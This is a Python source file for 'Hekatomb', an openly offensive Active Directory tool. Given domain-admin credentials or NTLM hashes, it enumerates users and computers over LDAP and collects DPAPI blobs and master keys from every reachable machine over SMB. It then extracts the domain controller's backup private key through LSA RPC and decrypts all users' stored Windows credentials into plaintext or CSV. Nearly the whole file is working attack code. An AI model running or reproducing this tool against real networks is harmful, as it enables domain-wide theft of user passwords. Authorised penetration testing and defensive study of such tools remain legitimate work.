#!/usr/bin/env python3
#
# HEKATOMB - Because Domain Admin rights are not enough. Hack them all.
#
# V 1.5.1
#
# Copyright (C) 2022 Les tutos de Processus. All rights reserved.
#
#
# Description:
#   Hekatomb is a python script that connects to LDAP directory to retrieve all computers and users informations.
#	Then it will download all DPAPI blob of all users from all computers.
#	Finally, it will extract domain controller private key through RPC uses it to decrypt all credentials.
#
# Author:
#   Processus (@ProcessusT)
# Collaborators:
#	C0wnuts (@kevin_racca)
#	kalu (@kalu_69)

import os, sys, argparse, random, string, time
# from ldap3 import Connection, Server, NTLM, ALL
from impacket.examples.utils import parse_target
from impacket.smbconnection import SMBConnection
from impacket.smb3structs import SMB2_DIALECT_002
from impacket.dcerpc.v5 import transport, lsad
from impacket import crypto
from impacket.uuid import bin_to_string
from impacket.dpapi import CredHist, PVK_FILE_HDR, PREFERRED_BACKUP_KEY, PRIVATE_KEY_BLOB, privatekeyblob_to_pkcs1, MasterKeyFile, MasterKey, DomainKey, DPAPI_DOMAIN_RSA_MASTER_KEY, CredentialFile, DPAPI_BLOB, CREDENTIAL_BLOB
import struct
import binascii
from binascii import hexlify
import dns.resolver
from impacket.examples.smbclient import MiniImpacketShell
import traceback
from Cryptodome.Cipher import PKCS1_v1_5
from datetime import datetime
from impacket.ese import getUnixTime
import hashlib
from hekatomb.ad_ldap import Connect_AD_ldap, Get_AD_users, Get_AD_computers, SmbScan, Get_online_computers
from hekatomb.blobs import Create_folders, Get_blob_and_mkf


sys.tracebacklimit = 0


def main():
	print("\n██░ ██ ▓█████  ██ ▄█▀▄▄▄     ▄▄▄█████▓ ▒█████   ███▄ ▄███▓ ▄▄▄▄   \n▓██░ ██▒▓█   ▀  ██▄█▒▒████▄   ▓  ██▒ ▓▒▒██▒  ██▒▓██▒▀█▀ ██▒▓█████▄ \n▒██▀▀██░▒███   ▓███▄░▒██  ▀█▄ ▒ ▓██░ ▒░▒██░  ██▒▓██    ▓██░▒██▒ ▄██\n░▓█ ░██ ▒▓█  ▄ ▓██ █▄░██▄▄▄▄██░ ▓██▓ ░ ▒██   ██░▒██    ▒██ ▒██░█▀  \n░▓█▒░██▓░▒████▒▒██▒ █▄▓█   ▓██▒ ▒██▒ ░ ░ ████▓▒░▒██▒   ░██▒░▓█  ▀█▓\n ▒ ░░▒░▒░░ ▒░ ░▒ ▒▒ ▓▒▒▒   ▓▒█░ ▒ ░░   ░ ▒░▒░▒░ ░ ▒░   ░  ░░▒▓███▀▒\n ▒ ░▒░ ░ ░ ░  ░░ ░▒ ▒░ ▒   ▒▒ ░   ░      ░ ▒ ▒░ ░  ░      ░▒░▒   ░ \n ░  ░░ ░   ░   ░ ░░ ░  ░   ▒    ░      ░ ░ ░ ▒  ░      ░    ░    ░ \n ░  ░  ░   ░  ░░  ░        ░  ░            ░ ░         ░    ░      \n   Because Domain Admin rights are not enough.\n\t\tHack them all.\n\n\t         @Processus\n\t            v1.5\n**************************************************\n\n")

	start = time.time()

	parser = argparse.ArgumentParser(add_help = True, description = "Script used to automate domain computers and users extraction from LDAP and extraction of domain controller private key through RPC to collect and decrypt all users' DPAPI secrets saved in Windows credential manager.")

	parser.add_argument('target', action='store', help='[[domain/]username[:password]@]<targetName or address of DC>')

	auth = parser.add_argument_group('authentication')
	auth.add_argument('-hashes', action="store", metavar = "LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH')

	options = parser.add_argument_group('authentication')
	options.add_argument('-pvk', action='store', help='\t\t\t\t\t\t\t\t\t\tDomain backup keys file')
	options.add_argument('-dns', action="store", help='DNS server IP address to resolve computers hostname')
	options.add_argument('-port', choices=['139', '445'], nargs='?', default='445', metavar="port", help='Port to connect to SMB Server')
	options.add_argument('-smb2', action="store_true", help='Force the use of SMBv2 protocol')
	options.add_argument('-just-user', action='store', help='Test only specified username')
	options.add_argument('-just-computer', action='store', help='Test only specified computer')
	options.add_argument('-md5', action="store_true", help='Print md5 hash instead of clear passwords')
	
	verbosity = parser.add_argument_group('verbosity')
	verbosity.add_argument('-csv', action="store_true", help='Export results to CSV file')
	verbosity.add_argument('-debug', action="store_true", help='Turn DEBUG output ON')
	verbosity.add_argument('-debugmax', action="store_true", help='Turn DEBUG output TO MAAAAXXXX')


	if len(sys.argv)==1:
		parser.print_help()
		sys.exit(1)

	options                             = parser.parse_args()
	domain, username, password, address = parse_target(options.target)
	passLdap 							= password
	if domain is None:
		domain = ''
	if password == '' and username != '' and options.hashes is None :
		from getpass import getpass
		password = getpass("Password:")
		passLdap = password
	if options.hashes is not None:
		lmhash, nthash = options.hashes.split(':')
		if '' == lmhash:
			lmhash = 'aad3b435b51404eeaad3b435b51404ee'
		passLdap       = f"{lmhash}:{nthash}"

	else:
		lmhash = ''
		nthash = ''

	if options.dns is None:
		dns_server = address
	else:
		dns_server = options.dns

	if options.smb2 is True:
		preferredDialect = SMB2_DIALECT_002
	else:
		preferredDialect = None

	debug = options.debug
	debugmax = options.debugmax
	port = int(options.port)

	myNameCharList = string.ascii_lowercase
	myNameLen      = random.randrange(6,12)
	myName         = ''.join((random.choice(myNameCharList) for i in range(myNameLen)))

	# test if account is domain admin by accessing to DC c$ share
	try:
		if options.debug is True or options.debugmax is True:
			print("Testing admin rights...")
		smbClient = SMBConnection(address, address, myName=myName, sess_port=port, preferredDialect=preferredDialect)
		smbClient.login(username, password, domain, lmhash, nthash)
		if smbClient.connectTree("c$") != 1:
			raise
		if options.debug is True or options.debugmax is True:
			print("Admin access granted.")
	except:
		print("Error : Account disabled or access denied. Are you really a domain admin ?")
		if options.debug is True or options.debugmax is True:
			import traceback
			traceback.print_exc()
		sys.exit(1)

	# try to connect to ldap
	ldapConnection,baseDN = Connect_AD_ldap(address, domain, username, passLdap, debug, debugmax)

	# catch all users in domain or just the specified one
	users_list = Get_AD_users(ldapConnection, baseDN, options.just_user, debug, debugmax)
	
	# catch all computers in domain or just the specified one
	computers_list = Get_AD_computers(ldapConnection, baseDN, options.just_computer, debug, debugmax)

	# # creating folders to store blobs and master key files
	blobFolder, mkfFolder, directory = Create_folders(domain, debug, debugmax)

	# Scanning computers list on SMB port
	if debug is True or debugmax is True:
		print("[+] Scanning computers list on SMB port ...")
	SmbScan(computers_list, domain, dns_server, port, debug, debugmax)

	online_computers = Get_online_computers()
	if debug is True or debugmax is True:
		print("[+] It seems that " + str(len(online_computers)) + " computers are online ...")

	if online_computers<1:
		print("\n[!] No computers available")
		sys.exit()
	# # Retrieving blobs and mkf files
	Get_blob_and_mkf(online_computers, users_list, username, password, domain, lmhash, nthash, myName, port, preferredDialect, blobFolder, mkfFolder, dns_server, debug, debugmax)


	

	if options.pvk is None:
		if debug is True:
			print("Domain backup keys not given.\nTrying to extract...")
		# get domain backup keys
		try:
			array_of_mkf_keys = []
			connection        = SMBConnection(address, address, myName=myName, preferredDialect=preferredDialect)
			connection.login(username, password, domain, lmhash, nthash)
			# create rpc pipe
			rpctransport = transport.DCERPCTransportFactory(r'ncacn_np:445[\pipe\lsarpc]')
			rpctransport.set_smb_connection(connection)
			dce = rpctransport.get_dce_rpc()
			dce.connect()
			# connection to LSA remotely through RPC
			dce.bind(lsad.MSRPC_UUID_LSAD)
			resp = lsad.hLsarOpenPolicy2(dce, lsad.POLICY_GET_PRIVATE_INFORMATION)

			# now retrieve backup key GUID : https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-bkrp/e8118398-d3da-45fc-827f-186f1c417b69
			buffer     = crypto.decryptSecret(connection.getSessionKey(), lsad.hLsarRetrievePrivateData(dce, resp['PolicyHandle'], "G$BCKUPKEY_PREFERRED"))
			guid       = bin_to_string(buffer)
			name       = "G$BCKUPKEY_{}".format(guid)
			secret     = crypto.decryptSecret(connection.getSessionKey(), lsad.hLsarRetrievePrivateData(dce, resp['PolicyHandle'], name))
			backup_key = PREFERRED_BACKUP_KEY(secret)
			pvk 	   = backup_key['Data'][:backup_key['KeyLength']]

			# see my PR on pypykatz to understand structure : https://github.com/skelsec/pypykatz/blob/master/pypykatz/dpapi/dpapi.py
			header                  = PVK_FILE_HDR()
			header['dwMagic']       = 0xb0b5f11e
			header['dwVersion']     = 0
			header['dwKeySpec']     = 1
			header['dwEncryptType'] = 0
			header['cbEncryptData'] = 0
			header['cbPvk']         = backup_key['KeyLength']
			key                     = header.getData() + pvk
			open(directory + "/pvkfile.pvk", 'wb').write(key)
		except:
			print("Error : Can't extract domain backup keys.")
			if options.debug is True or options.debugmax is True:
				import traceback
				traceback.print_exc()
			sys.exit(1)



	if options.pvk is not None or os.path.exists(directory+"/pvkfile.pvk"):
		pvk_file = directory + "/pvkfile.pvk"
		if options.pvk is not None:
			pvk_file = options.pvk

		# decrypt pvk file
		if options.debug is True:
			print("Domain backup keys found.")
			print("Trying to decrypt PVK file...")
		try:
			pvkfile = open(pvk_file, 'rb').read()
			key = PRIVATE_KEY_BLOB(pvkfile[len(PVK_FILE_HDR()):])
			private = privatekeyblob_to_pkcs1(key)
			cipher = PKCS1_v1_5.new(private)

			array_of_mkf_keys = []
			if options.debug is True:
				print("PVK file decrypted.\nTrying to decrypt all MFK...")

			for filename in os.listdir(mkfFolder):
				try:
					# open mkf and extract content
					fp = open(mkfFolder + "/" + filename, 'rb')
					data = fp.read()
					mkf= MasterKeyFile(data)
					data = data[len(mkf):]
					if mkf['MasterKeyLen'] > 0:
						mk = MasterKey(data[:mkf['MasterKeyLen']])
						data = data[len(mk):]
					if mkf['BackupKeyLen'] > 0:
						bkmk = MasterKey(data[:mkf['BackupKeyLen']])
						data = data[len(bkmk):]
					if mkf['CredHistLen'] > 0:
						ch = CredHist(data[:mkf['CredHistLen']])
						data = data[len(ch):]
					if mkf['DomainKeyLen'] > 0:
						dk = DomainKey(data[:mkf['DomainKeyLen']])
						data = data[len(dk):]
					# try to decrypt mkf with domain backup key
					decryptedKey = cipher.decrypt(dk['SecretData'][::-1], None)
					if decryptedKey:
						domain_master_key = DPAPI_DOMAIN_RSA_MASTER_KEY(decryptedKey)
						key = domain_master_key['buffer'][:domain_master_key['cbMasterKey']]
						array_of_mkf_keys.append(key)
						if options.debugmax is True:
							print("New mkf key decrypted : " + str(hexlify(key).decode('latin-1')) )
				except:
					if options.debugmax is True:
						print("Error occured while decrypting MKF.")
						import traceback
						traceback.print_exc()
					pass
			if options.debug is True:
				print(str( len(array_of_mkf_keys)) + " MKF keys have been decrypted !")
		except:
			print("Error occured while decrypting PVK file.")
			if options.debug is True:
				import traceback
				traceback.print_exc()
			os._exit(1)
	else:
		print("Domain backup keys not found.")
		if options.debug is True:
			import traceback
			traceback.print_exc()
		os._exit(1)	



	if len(array_of_mkf_keys) > 0:
		# We have MKF keys so we can start blob decryption
		if options.debug is True:
			print("Starting blob decryption with MKF keys...")
		array_of_credentials = []
		for current_computer in os.listdir(blobFolder):
			current_computer_folder = blobFolder + "/" + current_computer
			if current_computer != "." and current_computer != ".." and os.path.isdir(current_computer_folder):
				for username in os.listdir(current_computer_folder):
					current_user_folder = current_computer_folder + "/" + username
					if username != "." and username != ".." and os.path.isdir(current_user_folder):
						for filename in os.listdir(current_user_folder):
							try:
								fp   = open(current_user_folder + "/" + filename, 'rb')
								data = fp.read()
								cred = CredentialFile(data)
								blob = DPAPI_BLOB(cred['Data'])

								if options.debugmax is True:
									print("Starting decryption of blob " + filename + "...")

								for mkf_key in array_of_mkf_keys:
									try:
										decrypted = blob.decrypt(mkf_key)
										if decrypted is not None:
											creds = CREDENTIAL_BLOB(decrypted)
											tmp_cred = {}
											tmp_cred['foundon'] = str(current_computer)
											tmp_cred['inusersession'] = str(username)
											tmp_cred['lastwritten'] = datetime.utcfromtimestamp(getUnixTime(creds['LastWritten']))
											tmp_cred['target'] = creds['Target'].decode('utf-16le')
											tmp_cred["username"] = creds['Username'].decode('utf-16le')
											tmp_cred["password1"] = creds['Unknown'].decode('utf-16le') 
											tmp_cred["password2"] = str( creds['Unknown3'].decode('utf-16le') ) 
											if options.md5 is True:
												if len(creds['Unknown'].decode('utf-16le')) > 0:
													tmp_cred["password1"] = hashlib.md5(str( creds['Unknown'].decode('utf-16le')  ).encode('utf-8')).hexdigest()
												tmp_cred["password2"] = hashlib.md5(str( creds['Unknown3'].decode('utf-16le')  ).encode('utf-8')).hexdigest()
											array_of_credentials.append(tmp_cred)
									except:
										if options.debugmax is True:
											print("Error occured while decrypting blob file.")
											import traceback
											traceback.print_exc()
										pass
							except:
								if options.debug is True:
									print("Error occured while decrypting blob file.")
									import traceback
									traceback.print_exc()
								pass
		if len(array_of_credentials) > 0:
			if options.debug is True:
				end = time.time()
				elapsed = round(end - start)
				print("Credentials gathered and decrypted in " + str(elapsed) + " seconds\n")
				print(str(len(array_of_credentials)) + " credentials have been decrypted !\n")
			i = 0
			if options.csv is True:
				with open(directory + '/exported_credentials.csv', 'w', encoding='UTF8') as f:
					header = "Found on;Session username;LastWritten;Target;Username;Password 1;Password 2\n"
					f.write(header)
					for credential in array_of_credentials:
						i = i + 1
						current_row = str(credential['foundon']) +";"+ str(credential['inusersession'])+";"+  str(credential['lastwritten'])+";"+ str(credential['target'])+";"+ str(credential['username'])+";"+  str(credential['password1'])+";"+ str(credential['password2'])+"\n"
						f.write(current_row)
				print("File successfully saved to ./" + str(directory) + '/exported_credentials.csv')
			else:	
				for credential in array_of_credentials:
					if i == 0:
						print("***********************************************")
						i = i + 1
					print("Found on : " + str(credential['foundon']))
					print("Session username : " + str(credential['inusersession']))
					print("LastWritten : " + str(credential['lastwritten']))
					print("Target : " + str(credential['target']))
					print("Username : " + str(credential['username']))
					if len(credential['password1']) > 0:
						print("Password 1 : " + str(credential['password1']))
						print("Password 2 : " + str(credential['password2']))
					else:
						print("Password : " + str(credential['password2']))
					print("***********************************************")
				
				
		else:
			print("No credentials could be decrypted.")
			os._exit(1)
	else:
		print("No MKF have been decrypted.\nBlobs will not be decrypted.")
		os._exit(1)



if __name__ == "__main__":
	try:
		main()
	except KeyboardInterrupt:
		os._exit(1)
